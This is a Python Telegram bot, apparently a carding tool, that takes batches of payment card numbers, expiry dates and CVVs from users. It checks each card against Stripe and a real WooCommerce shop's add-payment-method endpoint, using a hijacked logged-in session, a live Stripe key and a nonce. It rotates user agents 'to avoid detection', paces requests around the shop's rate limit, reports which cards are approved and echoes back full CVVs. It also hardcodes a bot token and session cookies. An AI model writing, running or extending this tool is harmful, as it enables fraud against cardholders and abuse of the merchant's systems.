import os
import asyncio
import logging
import random
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import re
import json

# Bot Token
BOT_TOKEN = "8243740781:AAHN2lFQ936iYnC6eONc3Qq-ZakCwu8psm4"

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class CardProcessor:
    def __init__(self):
        self.stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        self.firstcorner_headers = {
            'accept': '*/*',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://firstcornershop.com',
            'priority': 'u=1, i',
            'referer': 'https://firstcornershop.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        self.cookies = {
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-11-23%2009%3A16%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirstcornershop.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-11-23%2009%3A16%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirstcornershop.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
            '_ga': 'GA1.1.544649996.1763891182',
            '_fbp': 'fb.1.1763891182124.100191493903906824',
            'tk_or': '%22%22',
            'tk_r3d': '%22%22',
            'tk_lr': '%22%22',
            'wp-wpml_current_language': 'en',
            'wordpress_logged_in_78c0d90855d1393844941d778c1edd5b': 'kingbbbbbbossagain%7C1765100794%7CUZJkJoh3tn5Cpuzdv8MLqCBYdqtAlsjH7teN1bxgNhT%7C6f88f70db09522909c635e1f55eaf64c1298d17167d0b682c74d530b103cbc8b',
            '_ga_RZ2HXYG5NY': 'GS2.1.s1763891181$o1$g1$t1763891199$j42$l0$h0',
            'tk_ai': 'EUEUi28hACsZwUsmIiACj1YP',
            'woodmart_cookies_1': 'accepted',
            '__stripe_mid': '5bbf1f4c-f90a-4ad8-bfb9-cf63867d37ec4d4287',
            '__stripe_sid': '14ef3e53-3dca-490a-8c04-33fa1e036a2f59ea92',
            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffirstcornershop.com%2Fmy-account%2Fadd-payment-method%2F',
            'tk_qs': '',
        }
        
        # Rate limiting protection
        self.last_request_time = 0
        self.min_request_interval = 30

    def parse_cards(self, text):
        """Parse cards from text in format: card_number|month|year|cvv"""
        cards = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or '|' not in line:
                continue
                
            parts = line.split('|')
            if len(parts) >= 4:
                cc = parts[0].strip()
                mes = parts[1].strip()
                ano = parts[2].strip()
                cvv = parts[3].strip()
                
                # Clean card number (remove spaces)
                cc = re.sub(r'\s+', '', cc)
                
                cards.append({
                    'cc': cc,
                    'mes': mes,
                    'ano': ano,
                    'cvv': cvv
                })
        
        return cards

    def handle_rate_limit(self):
        """Handle rate limiting by adding delays between requests"""
        current_time = time.time()
        time_since_last_request = current_time - self.last_request_time
        
        if time_since_last_request < self.min_request_interval:
            sleep_time = self.min_request_interval - time_since_last_request
            logger.info(f"🕒 Rate limiting: Sleeping for {sleep_time:.1f} seconds")
            time.sleep(sleep_time)
        
        self.last_request_time = time.time()

    def rotate_user_agent(self):
        """Rotate user agents to avoid detection"""
        user_agents = [
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        return random.choice(user_agents)

    def refresh_session(self):
        """Refresh session cookies and headers to avoid rate limiting"""
        new_ua = self.rotate_user_agent()
        self.stripe_headers['user-agent'] = new_ua
        self.firstcorner_headers['user-agent'] = new_ua
        
        random_delay = random.uniform(2, 5)
        time.sleep(random_delay)
        
        logger.info("🔄 Session refreshed with new user agent")

    def extract_short_response(self, api_response):
        """Extract short and meaningful response from API response"""
        try:
            response_data = json.loads(api_response)
            
            # Check for different response formats
            if isinstance(response_data, dict):
                # Check for error message
                if 'data' in response_data and 'error' in response_data['data']:
                    error_msg = response_data['data']['error'].get('message', 'Card declined')
                    return f"❌ {error_msg}"
                
                # Check for success
                if response_data.get('status') == 'success' or response_data.get('success') is True:
                    return "✅ Payment Method Added Successfully"
                
                # Check for generic error
                if 'error' in response_data:
                    error_msg = response_data['error'].get('message', 'Card declined')
                    return f"❌ {error_msg}"
            
            return "❌ Card Declined"
            
        except:
            return "❌ Unknown Response"

    def process_single_card(self, card):
        """Process a single card and return detailed result"""
        try:
            # Handle rate limiting
            self.handle_rate_limit()
            
            # Step 1: Create payment method with Stripe
            stripe_data = f'type=card&card[number]={card["cc"]}&card[cvc]={card["cvv"]}&card[exp_year]={card["ano"]}&card[exp_month]={card["mes"]}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F8702d4c73a%3B+stripe-js-v3%2F8702d4c73a%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffirstcornershop.com&time_on_page=34684&client_attribution_metadata[client_session_id]=d4c6bb58-34db-4ae2-adbb-e2d3abb4a541&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=11612e73-499d-441b-8269-6ea4b75accb8&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=5bbf1f4c-f90a-4ad8-bfb9-cf63867d37ec4d4287&sid=14ef3e53-3dca-490a-8c04-33fa1e036a2f59ea92&key=pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ&_stripe_version=2024-06-20'
            
            response1 = requests.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=self.stripe_headers, 
                data=stripe_data,
                timeout=30
            )
            
            stripe_response = response1.json()
            stripe_response_text = json.dumps(stripe_response)
            
            # Check Stripe response for errors
            if response1.status_code != 200:
                short_response = self.extract_short_response(stripe_response_text)
                return {
                    'card': card,
                    'status': '❌ DECLINED',
                    'gateway': 'Stripe',
                    'response_code': response1.status_code,
                    'api_response': stripe_response_text,
                    'short_response': short_response,
                    'raw_response': stripe_response
                }
            
            if 'id' not in stripe_response:
                short_response = self.extract_short_response(stripe_response_text)
                return {
                    'card': card,
                    'status': '❌ DECLINED',
                    'gateway': 'Stripe',
                    'response_code': response1.status_code,
                    'api_response': stripe_response_text,
                    'short_response': short_response,
                    'raw_response': stripe_response
                }
            
            payment_id = stripe_response["id"]
            
            # Step 2: Process with FirstCornerShop
            firstcorner_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': 'ceb088037e',
            }

            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }

            response2 = requests.post(
                'https://firstcornershop.com/', 
                params=params,
                cookies=self.cookies, 
                headers=self.firstcorner_headers, 
                data=firstcorner_data,
                timeout=30
            )
            
            firstcorner_response = response2.json()
            firstcorner_response_text = json.dumps(firstcorner_response)
            short_response = self.extract_short_response(firstcorner_response_text)
            
            # Check for rate limiting error
            if (response2.status_code == 200 and 
                'cannot add a new payment method so soon' in firstcorner_response_text.lower()):
                return {
                    'card': card,
                    'status': '⚠️ RATE LIMITED',
                    'gateway': 'STRIPE',
                    'response_code': response2.status_code,
                    'api_response': firstcorner_response_text,
                    'short_response': '⏳ Rate Limited - Try Again Later',
                    'raw_response': firstcorner_response,
                    'needs_delay': True
                }
            
            # Check FirstCorner response
            if response2.status_code == 200:
                # Check for success indicators
                if (firstcorner_response.get('status') == 'success' or 
                    firstcorner_response.get('success') is True or
                    'intent_secret' in str(firstcorner_response) or
                    'setup_intent' in str(firstcorner_response)):
                    return {
                        'card': card,
                        'status': '✅ APPROVED',
                        'gateway': 'STRIPE',
                        'response_code': response2.status_code,
                        'api_response': firstcorner_response_text,
                        'short_response': '✅ Payment Method Added Successfully',
                        'raw_response': firstcorner_response
                    }
                else:
                    return {
                        'card': card,
                        'status': '❌ DECLINED',
                        'gateway': 'STRIPE',
                        'response_code': response2.status_code,
                        'api_response': firstcorner_response_text,
                        'short_response': short_response,
                        'raw_response': firstcorner_response
                    }
            else:
                return {
                    'card': card,
                    'status': '❌ DECLINED',
                    'gateway': 'STRIPE',
                    'response_code': response2.status_code,
                    'api_response': firstcorner_response_text,
                    'short_response': short_response,
                    'raw_response': firstcorner_response
                }
                
        except requests.exceptions.Timeout:
            return {
                'card': card,
                'status': '⚠️ ERROR',
                'gateway': 'Timeout',
                'api_response': '{"error": "Request timeout"}',
                'short_response': '⏳ Request Timeout',
                'raw_response': {'error': 'Request timeout'}
            }
        except requests.exceptions.ConnectionError:
            return {
                'card': card,
                'status': '⚠️ ERROR',
                'gateway': 'Connection',
                'api_response': '{"error": "Connection error"}',
                'short_response': '🔌 Connection Error',
                'raw_response': {'error': 'Connection error'}
            }
        except Exception as e:
            return {
                'card': card,
                'status': '⚠️ ERROR',
                'gateway': 'Exception',
                'api_response': f'{{"error": "{str(e)}"}}',
                'short_response': f'🚨 Error: {str(e)[:50]}',
                'raw_response': {'error': str(e)}
            }

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    welcome_text = """🎛️ *FirstCorner Card Checker Bot*

💳 *Send cards in format:*
`card_number|month|year|cvv`

📝 *Example:*
`4919494022023748|02|27|976`

⚡ *Features:*
• ✅ APPROVED 🤑🤑
• ❌ DECLINE 😡😡
• ⏳ RATE LIMIT ⚠️⚠️
• 🎯 MADE BY @trial9pm

🛠️ *Commands:*
/start - Show this help
/check - Check cards

_Send multiple cards for bulk checking!_ 🚀"""
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /check command."""
    await update.message.reply_text(
        "🔄 *Ready to Check Cards!*\n\n"
        "Send your cards in this format:\n"
        "`card_number|month|year|cvv`\n\n"
        "*Example:*\n"
        "`4919494022023748|02|27|976`\n\n"
        "You can send multiple cards at once! 📊",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming messages and process cards."""
    user_message = update.message.text
    
    if not user_message or '|' not in user_message:
        await update.message.reply_text("❌ *Invalid Format!*\n\nSend cards as:\n`card_number|month|year|cvv`", parse_mode='Markdown')
        return
    
    # Show processing message
    processing_msg = await update.message.reply_text("🔄 *Processing Cards...*\n\n⏳ Please wait while I check your cards...")
    
    # Parse cards
    processor = CardProcessor()
    cards = processor.parse_cards(user_message)
    
    if not cards:
        await processing_msg.edit_text("❌ *No valid cards found!*")
        return
    
    total_cards = len(cards)
    await processing_msg.edit_text(f"🎛️ *Found {total_cards} Cards*\n\n⚡ Starting processing with rate limiting...")
    
    # Process cards
    approved_count = 0
    declined_count = 0
    rate_limited_count = 0
    error_count = 0
    results = []
    
    for i, card in enumerate(cards, 1):
        # Update progress
        progress_text = f"🔄 *Processing {i}/{total_cards}*\n\n💳 Card: `{card['cc'][-4:]}`\n⏳ Rate Protection: Active"
        await processing_msg.edit_text(progress_text, parse_mode='Markdown')
        
        # Process card
        result = processor.process_single_card(card)
        results.append(result)
        
        # Update counters
        if result['status'] == '✅ APPROVED':
            approved_count += 1
        elif result['status'] == '❌ DECLINED':
            declined_count += 1
        elif result['status'] == '⚠️ RATE LIMITED':
            rate_limited_count += 1
        else:
            error_count += 1
        
        # Create colorful response based on status
        if result['status'] == '✅ APPROVED':
            # Green success interface
            card_result_text = f"🟢 *CARD APPROVED* 🟢\n\n"
            card_result_text += f"💳 *Card:* `{card['cc'][:6]}...{card['cc'][-4:]}`\n"
            card_result_text += f"📅 *Exp:* `{card['mes']}/{card['ano']}`\n"
            card_result_text += f"🔐 *CVV:* `{card['cvv']}`\n\n"
            card_result_text += f"✅ *Status:* {result['short_response']}\n"
            card_result_text += f"🎯 *Gateway:* {result['gateway']}\n\n"
            card_result_text += "🎉 *Payment Method Added Successfully!*"
            
        elif result['status'] == '❌ DECLINED':
            # Red decline interface
            card_result_text = f"🔴 *CARD DECLINED* 🔴\n\n"
            card_result_text += f"💳 *Card:* `{card['cc'][:6]}...{card['cc'][-4:]}`\n"
            card_result_text += f"📅 *Exp:* `{card['mes']}/{card['ano']}`\n"
            card_result_text += f"🔐 *CVV:* `{card['cvv']}`\n\n"
            card_result_text += f"❌ *Status:* {result['short_response']}\n"
            card_result_text += f"🎯 *Gateway:* {result['gateway']}"
            
        elif result['status'] == '⚠️ RATE LIMITED':
            # Yellow rate limited interface
            card_result_text = f"🟡 *RATE LIMITED* 🟡\n\n"
            card_result_text += f"💳 *Card:* `{card['cc'][:6]}...{card['cc'][-4:]}`\n"
            card_result_text += f"📅 *Exp:* `{card['mes']}/{card['ano']}`\n\n"
            card_result_text += f"⏳ *Status:* {result['short_response']}\n"
            card_result_text += f"🎯 *Gateway:* {result['gateway']}\n\n"
            card_result_text += "⚠️ *Try this card again later*"
            
        else:
            # Gray error interface
            card_result_text = f"⚫ *ERROR* ⚫\n\n"
            card_result_text += f"💳 *Card:* `{card['cc'][:6]}...{card['cc'][-4:]}`\n"
            card_result_text += f"📅 *Exp:* `{card['mes']}/{card['ano']}`\n\n"
            card_result_text += f"🚨 *Status:* {result['short_response']}\n"
            card_result_text += f"🎯 *Gateway:* {result['gateway']}"
        
        # Send individual card result
        try:
            await update.message.reply_text(card_result_text, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            await update.message.reply_text(f"Error sending result for card: {card['cc'][-4:]}")
    
    # Send final summary
    summary_text = f"""📊 *PROCESSING COMPLETE*

✅ APPROVED: {approved_count}
❌ DECLINED: {declined_count}
⏳ RATE LIMITED: {rate_limited_count}
🚨 ERRORS: {error_count}
🎯 TOTAL: {total_cards}

💎 Success Rate: {(approved_count/total_cards*100) if total_cards > 0 else 0:.1f}%"""

    await update.message.reply_text(summary_text, parse_mode='Markdown')

def main():
    """Start the bot."""
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the Bot
    application.run_polling()
    logger.info("Bot is now running...")

if __name__ == '__main__':
    main()
